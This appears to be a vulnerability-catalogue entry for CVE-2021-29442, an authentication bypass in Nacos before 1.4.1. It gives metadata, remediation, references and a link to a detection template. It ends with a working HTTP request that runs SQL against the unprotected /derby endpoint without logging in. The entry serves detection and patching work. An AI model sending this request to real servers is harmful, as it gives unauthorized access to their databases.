---
layout: post
cve_id: CVE-2021-29442
title: Nacos <1.4.1 - Authentication Bypass
pcap: true
pcap_path: /pcaps/2021/CVE-2021-29442.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-29442.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dwisiswant0
severity: high
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access
  to sensitive data and potential compromise of the Nacos server.

  '
remediation: 'Upgrade Nacos to version 1.4.1 or later to mitigate the authentication
  bypass vulnerability (CVE-2021-29442).

  '
reference:
- https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/
- https://github.com/alibaba/nacos/issues/4463
- https://github.com/alibaba/nacos/pull/4517
- https://github.com/advisories/GHSA-36hp-jr8h-556f
- https://nvd.nist.gov/vuln/detail/CVE-2021-29442
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2021-29442
  cwe-id: CWE-306
  epss-score: 0.94002
  epss-percentile: 0.99884
  cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: alibaba
  product: nacos
tags:
- cve2021
- cve
- nacos
- auth-bypass
- alibaba
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Nacos before version 1.4.1 is vulnerable to authentication bypass because the ConfigOpsController lets the user perform management operations like querying the database or even wiping it out. While the /data/remove endpoint is properly protected with the @Secured annotation, the /derby endpoint is not protected and can be openly accessed by unauthenticated users. These endpoints are only valid when using embedded storage (derby DB) so this issue should not affect those installations using external storage (e.g. mysql).


## ðŸŒ HTTP Request
```nohighlight
GET /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

